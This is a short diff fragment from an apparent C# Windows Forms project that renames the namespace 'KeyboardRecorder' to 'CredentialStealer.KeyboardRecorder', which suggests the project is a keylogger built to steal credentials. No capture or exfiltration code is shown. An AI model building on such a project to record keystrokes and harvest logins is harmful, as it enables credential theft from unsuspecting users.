@@ -6,7 +6,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
-namespace KeyboardRecorder
+namespace CredentialStealer.KeyboardRecorder
 {
     class Program
     {
